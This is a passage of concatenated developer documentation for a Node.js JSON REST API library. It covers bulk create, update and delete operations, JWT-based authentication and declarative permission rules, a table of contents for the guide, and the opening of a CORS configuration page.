Handle cases where some deletes succeed and others fail:

```javascript
const mixedResult = await api.scopes.authors.bulkDelete({
  ids: ['1', '999', '2', '888'],  // Mix of valid and invalid IDs
  atomic: false  // Allow partial success
});

console.log(inspect(mixedResult));
// Output:
// {
//   meta: {
//     total: 4,
//     succeeded: 2,
//     failed: 2,
//     deleted: ['1', '2'],
//     atomic: false
//   },
//   errors: [
//     { index: 1, id: '999', status: 'error', error: { code: 'REST_API_RESOURCE', message: 'Resource not found' } },
//     { index: 3, id: '888', status: 'error', error: { code: 'REST_API_RESOURCE', message: 'Resource not found' } }
//   ]
// }
```

## HTTP API Usage

When using the Express plugin, bulk operations are available via HTTP endpoints:

```javascript
import { ExpressPlugin } from 'json-rest-api/plugins/core/connectors/express-plugin.js';
import express from 'express';

// Add Express plugin
await api.use(ExpressPlugin);

// Create and mount Express app
const app = express();
app.use(express.json());
api.http.express.mount(app);

app.listen(3000, () => {
  console.log('API with bulk operations running on http://localhost:3000');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

### HTTP Bulk Create

```bash
POST /api/authors/bulk
Content-Type: application/json

{
  "data": [
    { "type": "authors", "attributes": { "name": "Author One" } },
    { "type": "authors", "attributes": { "name": "Author Two" } }
  ]
}

# With query parameter for non-atomic mode
POST /api/authors/bulk?atomic=false
```

### HTTP Bulk Update

```bash
PATCH /api/authors/bulk
Content-Type: application/json

{
  "operations": [
    { "id": "1", "data": { "type": "authors", "id": "1", "attributes": { "name": "Updated Name" } } },
    { "id": "2", "data": { "type": "authors", "id": "2", "attributes": { "name": "Another Update" } } }
  ]
}
```

### HTTP Bulk Delete

```bash
DELETE /api/authors/bulk
Content-Type: application/json

{
  "data": ["1", "2", "3"]
}

# Alternative format
{
  "ids": ["1", "2", "3"]
}
```

## Advanced Features

### Batch Processing

The plugin processes records in configurable batches to manage memory usage:

```javascript
// Configure smaller batches for memory-constrained environments
await api.use(BulkOperationsPlugin, {
  'bulk-operations': {
    batchSize: 5,  // Process 5 records at a time internally
    maxBulkOperations: 1000  // But allow up to 1000 total
  }
});

// Create 100 records - processed in batches of 5
const largeDataset = Array.from({ length: 100 }, (_, i) => ({
  type: 'authors',
  attributes: { name: `Author ${i + 1}` }
}));

const result = await api.scopes.authors.bulkPost({
  inputRecords: largeDataset,
  atomic: true
});

console.log(`Created ${result.meta.succeeded} authors in batches`);
```

### Transaction Context

Bulk operations provide context information to hooks and plugins:

```javascript
// Add a hook that runs for each bulk operation
api.addHook('beforePost', 'bulkTracking', {}, async ({ context, params }) => {
  if (context.bulkOperation) {
    console.log(`Processing bulk item ${context.bulkIndex + 1}`);
  }
});
```

### Error Handling Patterns

Implement robust error handling for bulk operations:

```javascript
async function importAuthors(authorData) {
  try {
    const result = await api.scopes.authors.bulkPost({
      inputRecords: authorData,
      atomic: false  // Continue on errors
    });
    
    // Log successful imports
    console.log(`Imported ${result.meta.succeeded} of ${result.meta.total} authors`);
    
    // Handle errors if any
    if (result.errors && result.errors.length > 0) {
      console.error('Import errors:');
      result.errors.forEach(error => {
        console.error(`  Row ${error.index}: ${error.error.message}`);
      });
      
      // Return failed records for retry
      return authorData.filter((_, index) => 
        result.errors.some(e => e.index === index)
      );
    }
    
    return [];  // All succeeded
  } catch (error) {
    // Handle complete failure (e.g., database connection error)
    console.error('Bulk import failed completely:', error.message);
    throw error;
  }
}
```

### Performance Considerations

1. **Use Atomic Mode Wisely**: Atomic operations provide consistency but may be slower for large datasets
2. **Adjust Batch Sizes**: Larger batches improve performance but use more memory
3. **Enable Optimizations**: The plugin uses database-specific bulk insert optimizations when available
4. **Monitor Limits**: Set appropriate `maxBulkOperations` to prevent resource exhaustion

## Complete Example: Book Import System

Here's a complete example showing how to import a book catalog with all relationships:

```javascript
async function importBookCatalog(catalogData) {
  // Step 1: Import countries
  console.log('Importing countries...');
  const countryResult = await api.scopes.countries.bulkPost({
    inputRecords: catalogData.countries,
    atomic: true
  });
  
  // Step 2: Import publishers with country relationships
  console.log('Importing publishers...');
  const publisherResult = await api.scopes.publishers.bulkPost({
    inputRecords: catalogData.publishers,
    atomic: true
  });
  
  // Step 3: Import authors
  console.log('Importing authors...');
  const authorResult = await api.scopes.authors.bulkPost({
    inputRecords: catalogData.authors,
    atomic: true
  });
  
  // Step 4: Import books with country and publisher relationships
  console.log('Importing books...');
  const bookResult = await api.scopes.books.bulkPost({
    inputRecords: catalogData.books,
    atomic: false  // Allow partial success for books
  });
  
  // Step 5: Create author-book relationships
  console.log('Creating author-book relationships...');
  const relationshipData = [];
  
  for (const book of bookResult.data) {
    const bookAuthors = catalogData.bookAuthors[book.attributes.title] || [];
    for (const authorName of bookAuthors) {
      const author = authorResult.data.find(a => a.attributes.name === authorName);
      if (author) {
        relationshipData.push({
          type: 'book_authors',
          attributes: {
            book_id: parseInt(book.id),
            author_id: parseInt(author.id)
          }
        });
      }
    }
  }
  
  const relationshipResult = await api.scopes.book_authors.bulkPost({
    inputRecords: relationshipData,
    atomic: false
  });
  
  // Summary
  console.log('\nImport Summary:');
  console.log(`- Countries: ${countryResult.meta.succeeded}`);
  console.log(`- Publishers: ${publisherResult.meta.succeeded}`);
  console.log(`- Authors: ${authorResult.meta.succeeded}`);
  console.log(`- Books: ${bookResult.meta.succeeded} (${bookResult.meta.failed} failed)`);
  console.log(`- Relationships: ${relationshipResult.meta.succeeded}`);
  
  return {
    countries: countryResult.meta.succeeded,
    publishers: publisherResult.meta.succeeded,
    authors: authorResult.meta.succeeded,
    books: bookResult.meta.succeeded,
    relationships: relationshipResult.meta.succeeded,
    errors: bookResult.errors || []
  };
}

// Example usage
const catalogData = {
  countries: [
    { type: 'countries', attributes: { name: 'United States', code: 'US' } },
    { type: 'countries', attributes: { name: 'United Kingdom', code: 'UK' } }
  ],
  publishers: [
    { 
      type: 'publishers', 
      attributes: { name: 'Penguin Random House' },
      relationships: { country: { data: { type: 'countries', id: '1' } } }
    }
  ],
  authors: [
    { type: 'authors', attributes: { name: 'Stephen King' } },
    { type: 'authors', attributes: { name: 'J.K. Rowling' } }
  ],
  books: [
    {
      type: 'books',
      attributes: { title: 'The Shining' },
      relationships: {
        country: { data: { type: 'countries', id: '1' } },
        publisher: { data: { type: 'publishers', id: '1' } }
      }
    }
  ],
  bookAuthors: {
    'The Shining': ['Stephen King']
  }
};

const importResults = await importBookCatalog(catalogData);
```

## Summary

The Bulk Operations plugin provides powerful capabilities for processing multiple records efficiently:

- **Three Core Operations**: bulkPost, bulkPatch, and bulkDelete
- **Atomic Transactions**: All-or-nothing processing for data consistency
- **Partial Success Mode**: Continue processing despite individual failures
- **Batch Processing**: Efficient handling of large datasets
- **Full JSON:API Support**: Maintains compatibility with standard format
- **HTTP Endpoints**: RESTful API for bulk operations

Use bulk operations when you need to:
- Import or export large datasets
- Apply consistent updates across multiple records
- Delete multiple records safely
- Optimize performance by reducing API calls

Remember to consider transaction modes, error handling, and performance implications when designing your bulk operation workflows.# Permissions and Authentication Guide

The JWT Authentication Plugin provides a powerful declarative permission system that makes it easy to secure your REST API resources. This guide shows you how to use authentication and define permissions using the book catalog example.

## Table of Contents
- [Overview](#overview)
- [Quick Start](#quick-start)
- [Getting Tokens from Auth Providers](#getting-tokens-from-auth-providers)
  - [Supabase](#supabase)
  - [Auth0](#auth0)
  - [Custom JWT](#custom-jwt)
- [Installation and Setup](#installation-and-setup)
- [Declarative Permissions](#declarative-permissions)
- [Built-in Auth Checkers](#built-in-auth-checkers)
- [Making Authenticated API Calls Directly](#making-authenticated-api-calls-directly)
- [Using Auth Helpers](#using-auth-helpers)
- [Token Management](#token-management)
- [Custom Auth Checkers](#custom-auth-checkers)
- [Examples](#examples)
- [Best Practices](#best-practices)

## Overview

The JWT Auth Plugin provides two main features:

1. **Authentication** - Validates JWT tokens and populates `context.auth`
2. **Authorization** - Declarative permission rules on resources

The plugin validates tokens from any JWT provider (Supabase, Auth0, your own auth server) and enforces permissions you define on your resources.

## Quick Start

Here's how to get authentication working in 3 steps:

### 1. Get JWT tokens from your auth provider
```javascript
// Example with Supabase (in your frontend)
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)

// User login
const { data: { session } } = await supabase.auth.signInWithPassword({
  email: 'user@example.com',
  password: 'password'
})

const token = session.access_token // This is your JWT token!
```

### 2. Configure the plugin in your API
```javascript
// In your API server
await api.use(JwtAuthPlugin, {
  // For Supabase
  jwksUrl: `${SUPABASE_URL}/auth/v1/.well-known/jwks.json`,
  rolesField: 'app_metadata.roles'
})
```

### 3. Define permissions on resources
```javascript
await api.addResource('posts', {
  schema: { /* ... */ },
  
  auth: {
    query: ['public'],         // Anyone can read
    post: ['authenticated'],   // Must be logged in
    patch: ['is_owner'],       // Must own the post
    delete: ['is_owner', 'admin'] // Owner or admin
  }
})
```

That's it! Your API now requires authentication and enforces permissions.

## Getting Tokens from Auth Providers

The plugin doesn't generate tokens - it validates them. Here's how to get tokens from popular providers:

### Supabase

#### Step 1: Set up Supabase Auth
```javascript
// In your frontend app
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  'https://your-project.supabase.co',
  'your-anon-key'
)
```

#### Step 2: User Registration/Login
```javascript
// Sign up new user
const { data, error } = await supabase.auth.signUp({
  email: 'user@example.com',
  password: 'secure-password'
})

// Sign in existing user
const { data: { session } } = await supabase.auth.signInWithPassword({
  email: 'user@example.com',
  password: 'secure-password'
})

// The JWT token is in session.access_token
const token = session.access_token
```

#### Step 3: Use token with your API
```javascript
// Make authenticated requests to your API
const response = await fetch('https://your-api.com/api/posts', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    data: {
      type: 'posts',
      attributes: {
        title: 'My Post',
        content: 'Hello world'
      }
    }
  })
})
```

#### Step 4: Configure plugin for Supabase
```javascript
await api.use(JwtAuthPlugin, {
  // Supabase JWKS URL - replace with your project URL
  jwksUrl: `${process.env.SUPABASE_URL}/auth/v1/.well-known/jwks.json`,
  
  // Supabase stores roles in app_metadata
  rolesField: 'app_metadata.roles',
  
  // Optional: Add these for extra security
  audience: 'authenticated',
  issuer: process.env.SUPABASE_URL
})
```

### Auth0

#### Step 1: Set up Auth0
```javascript
// In your frontend
import { createAuth0Client } from '@auth0/auth0-spa-js'

const auth0 = await createAuth0Client({
  domain: 'your-domain.auth0.com',
  clientId: 'your-client-id',
  authorizationParams: {
    redirect_uri: window.location.origin,
    audience: 'https://your-api.com'
  }
})
```

#### Step 2: User Login
```javascript
// Redirect to Auth0 login
await auth0.loginWithRedirect()

// After redirect back, get token
const token = await auth0.getAccessTokenSilently()
```

#### Step 3: Configure plugin for Auth0
```javascript
await api.use(JwtAuthPlugin, {
  jwksUrl: `https://${AUTH0_DOMAIN}/.well-known/jwks.json`,
  audience: process.env.AUTH0_AUDIENCE,
  issuer: `https://${AUTH0_DOMAIN}/`,
  
  // Auth0 uses custom claims
  rolesField: 'https://your-app.com/roles'
})
```

### Custom JWT

If you're generating your own JWTs:

#### Step 1: Generate tokens in your auth server
```javascript
// In your auth server
import jwt from 'jsonwebtoken'

const token = jwt.sign(
  {
    sub: user.id,           // User ID
    email: user.email,
    roles: ['user', 'editor'],
    jti: generateUniqueId(), // For revocation
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour
  },
  process.env.JWT_SECRET,
  { algorithm: 'HS256' }
)
```

#### Step 2: Configure plugin with secret
```javascript
await api.use(JwtAuthPlugin, {
  secret: process.env.JWT_SECRET,
  
  // Your token structure
  userIdField: 'sub',
  rolesField: 'roles'
})
```

## Installation and Setup

```javascript
import { JwtAuthPlugin } from 'json-rest-api/plugins/core/jwt-auth-plugin.js';

// Install the plugin
await api.use(JwtAuthPlugin, {
  // Required: Choose one authentication method
  secret: 'your-secret-key',              // For HS256 tokens
  // OR
  publicKey: '-----BEGIN PUBLIC KEY...', // For RS256 tokens  
  // OR
  jwksUrl: 'https://your-auth-provider.com/.well-known/jwks.json', // For external auth
  
  // Optional: Token configuration
  audience: 'your-api-audience',
  issuer: 'https://your-auth-provider.com',
  
  // Optional: Field mappings
  userIdField: 'sub',        // Where to find user ID in token (default: 'sub')
  rolesField: 'roles',       // Where to find roles (default: 'roles')
  ownershipField: 'user_id', // Field in resources for ownership (default: 'user_id')
  
  // Optional: Revocation settings
  revocation: {
    enabled: true,           // Enable token revocation (default: true)
    storage: 'database',     // 'database' or 'memory' (default: 'database')
  },
  
  // Optional: Endpoints
  endpoints: {
    logout: '/auth/logout',   // Add logout endpoint
    session: '/auth/session'  // Add session check endpoint
  }
});
```

## How Auth Rules Work

**Important**: Auth rules must be defined in the same configuration object as your schema when calling `addResource`:

```javascript
await api.addResource('resource-name', {
  schema: { ... },        // Your field definitions
  relationships: { ... }, // Optional relationships
  auth: {                 // Permission rules go here!
    query: ['public'],
    get: ['public'],
    post: ['authenticated'],
    patch: ['is_owner', 'has_role:editor', 'admin'],
    delete: ['is_owner', 'has_role:moderator', 'admin']
  }
});
```

The JWT plugin will automatically extract these rules and enforce them on all operations.

### Common Permission Patterns

```javascript
// Public read, authenticated write
auth: {
  query: ['public'],
  get: ['public'],
  post: ['authenticated'],
  patch: ['authenticated'],
  delete: ['admin']
}

// Private resource with role-based access
auth: {
  query: ['authenticated'],
  get: ['authenticated'],
  post: ['has_role:author', 'has_role:editor'],
  patch: ['is_owner', 'has_role:editor'],
  delete: ['is_owner', 'has_role:moderator', 'admin']
}

// Admin-only resource
auth: {
  query: ['admin'],
  get: ['admin'],
  post: ['admin'],
  patch: ['admin'],
  delete: ['admin']
}

// User profiles (self-service)
auth: {
  query: ['admin'],                    // Only admins can list all users
  get: ['is_owner', 'admin'],         // Users can see their own profile
  post: ['admin'],                     // Only admins create users
  patch: ['is_owner', 'admin'],       // Users can edit their own profile
  delete: ['admin']                    // Only admins can delete users
}
```

## Declarative Permissions

Instead of writing permission checks in hooks, you declare permissions directly on your resources:

```javascript
await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    content: { type: 'text' },
    user_id: { type: 'string' },
    country_id: { type: 'number', belongsTo: 'countries', as: 'country' },
    published: { type: 'boolean', default: false }
  },
  
  // Declare permissions for each operation
  auth: {
    query: ['public'],                    // Anyone can list books
    get: ['public'],                      // Anyone can read a book
    post: ['authenticated'],              // Must be logged in to create
    patch: ['is_owner', 'has_role:editor', 'admin'], // Owner, editor, or admin
    delete: ['is_owner', 'admin']         // Only owner or admin
  }
});
```

The permission rules are checked automatically - no manual hook writing needed!

## Built-in Auth Checkers

The plugin includes these auth checkers out of the box:

### `public`
Anyone can access, no authentication required.

```javascript
auth: {
  query: ['public']  // Anyone can list resources
}
```

### `authenticated`
User must be logged in (have a valid token).

```javascript
auth: {
  post: ['authenticated']  // Must be logged in to create
}
```

### `is_owner`
User must own the resource (their ID matches the ownership field).

```javascript
auth: {
  patch: ['is_owner'],  // Only owner can update
  delete: ['is_owner']  // Only owner can delete
}

// The plugin checks: record.user_id === context.auth.userId
// The ownership field is configurable (default: 'user_id')
```

### `admin`
User must have the 'admin' role.

```javascript
auth: {
  delete: ['admin']  // Only admins can delete
}
```

### `has_role:X`
User must have a specific role.

```javascript
auth: {
  patch: ['has_role:editor'],        // Must be editor
  delete: ['has_role:moderator']     // Must be moderator
}
```

### `has_permission:X`
User must have a specific permission (for fine-grained control).

```javascript
auth: {
  patch: ['has_permission:posts:write'],
  delete: ['has_permission:posts:delete']
}
```

## Making Authenticated API Calls Directly

When using the API programmatically (not through HTTP), you can pass authentication context as the second parameter to any API method:

### Direct API Usage

```javascript
// Import your configured API
import { api } from './your-api-setup.js';

// Make authenticated calls by passing auth context as second parameter
const authContext = {
  auth: {
    userId: 'user-123',
    email: 'user@example.com',
    role: 'admin',
    // Any other auth data your app needs
  }
};

// Query with auth
const books = await api.resources.books.query({
  filters: { published: true },
  include: ['author'],
  page: { size: 10 }
}, authContext);

// Get single resource with auth
const book = await api.resources.books.get({
  id: 123
}, authContext);

// Create with auth
const newBook = await api.resources.books.post({
  inputRecord: {
    data: {
      type: 'books',
      attributes: {
        title: 'My New Book',
        isbn: '978-3-16-148410-0'
      }
    }
  }
}, authContext);

// Update with auth
const updated = await api.resources.books.patch({
  id: 123,
  inputRecord: {
    data: {
      type: 'books',
      id: '123',
      attributes: {
        title: 'Updated Title'
      }
    }
  }
}, authContext);

// Delete with auth
await api.resources.books.delete({
  id: 123
}, authContext);
```

### Multi-tenancy Example

If using the MultiHome plugin for multi-tenancy:

```javascript
// Tenant-specific context
const tenantContext = {
  auth: {
    userId: 'user-123',
    multihome_id: 'tenant-a'  // Required for multihome
  }
};

// All operations will be scoped to tenant-a
const tenantProjects = await api.resources.projects.query({}, tenantContext);
```

### Script/Admin Usage

For administrative scripts or background jobs:

```javascript
// Admin context with elevated privileges
const adminContext = {
  auth: {
    userId: 'system',
    role: 'superadmin',
    isSystem: true
  }
};

// Batch operations
async function processAllBooks() {
  const books = await api.resources.books.query({
    page: { size: 100 }
  }, adminContext);
  
  for (const book of books.data) {
    // Process each book with admin privileges
    await api.resources.books.patch({
      id: book.id,
      inputRecord: { /* ... */ }
    }, adminContext);
  }
}
```

### Testing Example

In tests, you can easily simulate different users:

```javascript
// Test different permission scenarios
const contexts = {
  anonymous: {},  // No auth
  regular: { auth: { userId: 'user-1', role: 'member' } },
  editor: { auth: { userId: 'user-2', role: 'editor' } },
  admin: { auth: { userId: 'user-3', role: 'admin' } }
};

// Test that regular users can't delete
await assert.rejects(
  api.resources.books.delete({ id: 1 }, contexts.regular),
  /Forbidden/
);

// Test that editors can update
await api.resources.books.patch({
  id: 1,
  inputRecord: { /* ... */ }
}, contexts.editor);
```

## Using Auth Helpers

While declarative permissions handle most cases, you can also use auth helpers in custom hooks:

```javascript
// In any hook, you have access to helpers.auth
api.addHook('beforeCreate', async ({ context, inputRecord, helpers }) => {
  // Require authentication
  helpers.auth.requireAuth(context);
  
  // Require specific roles
  helpers.auth.requireRoles(context, ['editor', 'admin']);
  
  // Check ownership (multiple ways)
  helpers.auth.requireOwnership(context);              // Uses context.existingRecord
  helpers.auth.requireOwnership(context, record);      // Pass record
  helpers.auth.requireOwnership(context, '123');       // Pass user ID
  
  // Set owner on new records
  inputRecord.user_id = context.auth.userId;
});
```

## Token Management

### Context Population

When a valid JWT token is provided, the plugin populates `context.auth`:

```javascript
context.auth = {
  userId: '123',                    // From token 'sub' claim
  email: 'user@example.com',        // From token 'email' claim
  roles: ['user', 'editor'],        // From token 'roles' claim
  permissions: ['posts:write'],     // From token 'permissions' claim
  token: { /* full JWT payload */ },
  tokenId: 'jti-value'              // For revocation
}
```

### Token Revocation and Logout

The plugin supports token revocation for logout and security. Here's how it works:

#### Frontend Logout Flow
```javascript
// 1. Call your API's logout endpoint
await fetch('/api/auth/logout', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// 2. Clear local storage
localStorage.removeItem('supabase.auth.token');

// 3. Sign out from Supabase (optional but recommended)
await supabase.auth.signOut();
```

#### API-Side Token Management
```javascript
// The plugin provides these methods:

// In your custom endpoints
await helpers.auth.logout(context);  // Revokes current token

// Revoke specific token (e.g., from webhook)
await helpers.auth.revokeToken(jti, userId, expiresAt);

// Check current session
GET /api/auth/session
// Returns: { authenticated: true/false, user: {...} }
```

#### Handling Auth Provider Webhooks

If your auth provider supports webhooks, you can sync logouts:

```javascript
// Handle Supabase auth events
api.addRoute('POST', '/webhooks/supabase-auth', async ({ body }) => {
  if (body.event === 'SIGNED_OUT') {
    // Revoke the token in your API too
    await helpers.auth.revokeToken(
      body.logout_token_id,
      body.user_id,
      body.token_exp
    );
  }
});
```

### Working with Different Auth Providers

The plugin works with any JWT provider. Here are the common configurations:

#### Supabase Configuration
```javascript
await api.use(JwtAuthPlugin, {
  jwksUrl: `${SUPABASE_URL}/auth/v1/.well-known/jwks.json`,
  rolesField: 'app_metadata.roles',     // Supabase stores custom data here
  
  // Add roles in Supabase Dashboard:
  // Authentication > Users > Select User > Edit User Metadata
  // Add to app_metadata: { "roles": ["admin", "editor"] }
});
```

#### Auth0 Configuration
```javascript
await api.use(JwtAuthPlugin, {
  jwksUrl: `https://${AUTH0_DOMAIN}/.well-known/jwks.json`,
  audience: AUTH0_AUDIENCE,
  issuer: `https://${AUTH0_DOMAIN}/`,
  rolesField: 'https://your-app.com/roles',  // Auth0 uses namespaced claims
  
  // Add roles in Auth0:
  // Create a Rule or Action that adds roles to the token
});
```

#### Firebase Auth Configuration
```javascript
await api.use(JwtAuthPlugin, {
  jwksUrl: 'https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com',
  audience: process.env.FIREBASE_PROJECT_ID,
  issuer: `https://securetoken.google.com/${process.env.FIREBASE_PROJECT_ID}`,
  rolesField: 'custom_claims.roles'
});
```

## Custom Auth Checkers

You can create domain-specific auth checkers:

```javascript
// Register a custom checker
helpers.auth.registerChecker('is_team_member', async (context, { existingRecord }) => {
  if (!context.auth?.userId) return false;
  
  // Check if user is part of the team
  const team = await api.resources.teams.get({ 
    id: existingRecord.team_id 
  });
  
  return team.member_ids.includes(context.auth.userId);
});

// Use in a resource
await api.addResource('team_documents', {
  schema: { /* ... */ },
  
  auth: {
    query: ['is_team_member'],
    get: ['is_team_member'],
    patch: ['is_team_member', 'admin']
  }
});
```

## Complete Example: Book Catalog API

Let's build a complete authenticated book catalog API:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin, RestApiKnexPlugin, HttpPlugin } from 'json-rest-api';
import { JwtAuthPlugin } from 'json-rest-api/plugins/core/jwt-auth-plugin.js';

// 1. Create and configure API
const api = new Api();

await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex });

// 2. Configure JWT Auth for Supabase
await api.use(JwtAuthPlugin, {
  jwksUrl: `${process.env.SUPABASE_URL}/auth/v1/.well-known/jwks.json`,
  rolesField: 'app_metadata.roles',
  ownershipField: 'user_id'
});

// 3. Define authenticated resources
await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    isbn: { type: 'string' },
    user_id: { type: 'string' },        // Owner
    country_id: { type: 'number', belongsTo: 'countries' },
    published: { type: 'boolean', default: false }
  },
  
  auth: {
    query: ['public'],                  // Anyone can browse
    get: ['public'],                    // Anyone can read
    post: ['authenticated'],            // Must be logged in
    patch: ['is_owner', 'has_role:librarian'], // Owner or librarian
    delete: ['is_owner', 'admin']       // Owner or admin
  }
});

// 4. Auto-set ownership on create
api.addHook('beforeCreate', async ({ context, inputRecord, scopeName }) => {
  if (scopeName === 'books' && context.auth) {
    inputRecord.user_id = context.auth.userId;
  }
});

// 5. Filter unpublished books for anonymous users
api.addHook('beforeQuery', async ({ context, queryParams, scopeName }) => {
  if (scopeName === 'books' && !context.auth) {
    queryParams.filter = { ...queryParams.filter, published: true };
  }
});

// 6. Start HTTP server
await api.use(HttpPlugin, { port: 3000, basePath: '/api' });

// Frontend usage:
// const { data: { session } } = await supabase.auth.signIn(...)
// const token = session.access_token
// 
// fetch('/api/books', {
//   headers: { 'Authorization': `Bearer ${token}` }
// })
```

## More Examples

### Public Blog with Private Drafts

```javascript
await api.addResource('posts', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    content: { type: 'text' },
    user_id: { type: 'string' },
    published: { type: 'boolean', default: false }
  },
  
  auth: {
    query: ['public'],           // Anyone can list
    get: ['public'],             // Anyone can read
    post: ['authenticated'],     // Must be logged in to create
    patch: ['is_owner'],         // Only owner can edit
    delete: ['is_owner', 'admin'] // Owner or admin can delete
  }
});

// Add custom filtering for drafts
api.addHook('beforeQuery', async ({ context, queryParams }) => {
  // Non-owners only see published posts
  if (!context.auth || context.auth.userId !== queryParams.filter?.user_id) {
    queryParams.filter = { ...queryParams.filter, published: true };
  }
});
```

### Multi-Author Books

```javascript
await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    publisher_id: { type: 'number', belongsTo: 'publishers' }
  },
  
  relationships: {
    authors: { hasMany: 'authors', through: 'book_authors' }
  },
  
  auth: {
    query: ['public'],
    get: ['public'],
    post: ['has_role:author', 'has_role:editor'],
    patch: ['is_book_author', 'has_role:editor'],
    delete: ['admin']
  }
});

// Custom checker for multi-author books
helpers.auth.registerChecker('is_book_author', async (context, { existingRecord }) => {
  if (!context.auth?.userId || !existingRecord) return false;
  
  const bookAuthors = await api.resources.book_authors.query({
    queryParams: {
      filter: {
        book_id: existingRecord.id,
        author_id: context.auth.userId
      }
    }
  });
  
  return bookAuthors.length > 0;
});
```

### Admin Panel

```javascript
await api.addResource('users', {
  schema: {
    id: { type: 'id' },
    email: { type: 'string', required: true },
    role: { type: 'string' },
    banned: { type: 'boolean', default: false }
  },
  
  auth: {
    query: ['admin', 'has_role:user_manager'],
    get: ['admin', 'has_role:user_manager', 'is_self'],
    post: ['admin'],
    patch: ['admin', 'has_role:user_manager', 'is_self'],
    delete: ['admin']
  }
});

// Users can view/edit their own profile
helpers.auth.registerChecker('is_self', (context, { existingRecord }) => {
  return context.auth?.userId === existingRecord?.id;
});
```

## Best Practices

### 1. Use Declarative Permissions

Instead of:
```javascript
// ❌ Manual permission checks in hooks
api.addHook('checkPermissions', async ({ context, operation }) => {
  if (operation === 'post' && !context.auth) {
    throw new Error('Must be authenticated');
  }
});
```

Do this:
```javascript
// ✅ Declarative permissions
auth: {
  post: ['authenticated']
}
```

### 2. Combine Rules with OR Logic

Multiple rules in an array work as OR conditions:
```javascript
auth: {
  patch: ['is_owner', 'has_role:moderator', 'admin']
  // Can update if: owner OR moderator OR admin
}
```

### 3. Set Ownership on Create

```javascript
api.addHook('beforeCreate', async ({ context, inputRecord, scopeName }) => {
  // Set owner for user-owned resources
  if (scopeName === 'posts' && context.auth) {
    inputRecord.user_id = context.auth.userId;
  }
});
```

### 4. Use Appropriate Checkers

- `public` - For truly public data
- `authenticated` - When you just need a logged-in user
- `is_owner` - For user-owned resources
- `has_role:X` - For role-based access
- `admin` - For administrative functions

### 5. Handle Unauthenticated Users Gracefully

```javascript
// Filter data for unauthenticated users instead of denying access
api.addHook('beforeQuery', async ({ context, queryParams, scopeName }) => {
  if (scopeName === 'posts' && !context.auth) {
    // Only show published posts to anonymous users
    queryParams.filter = { ...queryParams.filter, published: true };
  }
});
```

### 6. Create Semantic Custom Checkers

```javascript
// ✅ Good: Semantic name that explains the permission
helpers.auth.registerChecker('can_moderate_content', (context) => {
  return context.auth?.roles?.includes('moderator') || 
         context.auth?.roles?.includes('admin');
});

// ❌ Bad: Technical implementation detail
helpers.auth.registerChecker('has_mod_or_admin', (context) => {
  // Same logic but less clear intent
});
```

## Summary

The JWT Auth Plugin provides a clean, declarative way to handle authentication and authorization in your REST API. By defining permissions directly on resources, you eliminate boilerplate code and create a more maintainable, secure API.

Key benefits:
- **No manual hook writing** for common permission patterns
- **Clear, readable** permission declarations
- **Flexible** enough for complex scenarios
- **Secure by default** with deny-by-default behavior
- **Extensible** with custom checkers

Whether you're building a simple blog or a complex multi-tenant application, the declarative permission system scales with your needs while keeping your code clean and maintainable.# JSON REST API Complete Guide

Welcome to the comprehensive guide for JSON REST API. This guide will walk you through everything from initial setup to advanced features.

## Table of Contents

### Core Chapters

1. **[Initial Setup](GUIDE_1_Initial_Setup.md)**  
   Get started with JSON REST API, create your first API instance, and understand the basic concepts.

2. **[Data and Relations](GUIDE_2_Data_And_Relations.md)**  
   Learn how to define resources, set up relationships, and work with your data model.

3. **[Field Transformations](GUIDE_3_Field_Transformations.md)**  
   Transform data with virtual fields, getters, setters, computed fields, and visibility control.

4. **[Authentication and Permissions](GUIDE_4_Authentication_And_Permissions.md)**  
   Implement security with authentication strategies and fine-grained permissions.

5. **[Non-Database Resources](GUIDE_5_Non-Db_Resources.md)**  
   Connect your API to alternative data sources beyond traditional databases.

6. **[Positioning](GUIDE_6_Positioning.md)**  
   Implement drag-and-drop functionality with automatic position management.

7. **[Hooks, Data Management, and Plugins](GUIDE_7_Hooks_Data_Management_And_Plugins.md)**  
   Master the hook system for data validation, transformation, and business logic.


### Additional Topics

- **[File Uploads](GUIDE_X_File_Uploads.md)**  
  Handle file uploads with multiple backends (file system, S3).

- **[Bulk Operations](GUIDE_X_Bulk_Operations.md)**  
  Handle multiple records efficiently with bulk create, update, and delete operations.

- **[CORS Configuration](GUIDE_X_Cors.md)**  
  Set up Cross-Origin Resource Sharing for browser-based applications.

- **[Multihome Support](GUIDE_X_Multihome.md)**  
  Run multiple API instances or serve different domains from a single server.

- **[Socket.IO Integration](GUIDE_X_SocketIO.md)**  
  Add real-time capabilities to your API with WebSocket support.

- **[Appendices](GUIDE_Y_Appendices.md)**  
  Reference material, troubleshooting, and additional resources.

## Prerequisites

Before starting this guide, you should have:

- Node.js 20+ installed
- Basic knowledge of JavaScript and REST APIs
- Familiarity with npm/yarn package management

---

Ready to get started? Head to [Chapter 1: Initial Setup](GUIDE_1_Initial_Setup.md) →# CORS Plugin Guide

Cross-Origin Resource Sharing (CORS) is essential for APIs accessed by web browsers. This guide shows you how to use the CORS plugin to enable cross-origin requests in your JSON REST API.

## Table of Contents
1. [Basic Setup](#basic-setup)
2. [Configuration Options](#configuration-options)
3. [Common Use Cases](#common-use-cases)
4. [Advanced Patterns](#advanced-patterns)
6. [Troubleshooting](#troubleshooting)


## Intro: What is CORS

CORS stands for **Cross-Origin Resource Sharing**. It's a security feature implemented by web browsers to protect users from malicious websites.

**The server ALWAYS responds to requests regardless of origin.** CORS is enforced by the BROWSER, not the server. This is a crucial distinction:

- ✅ **Servers**: Always process and respond to requests from any origin
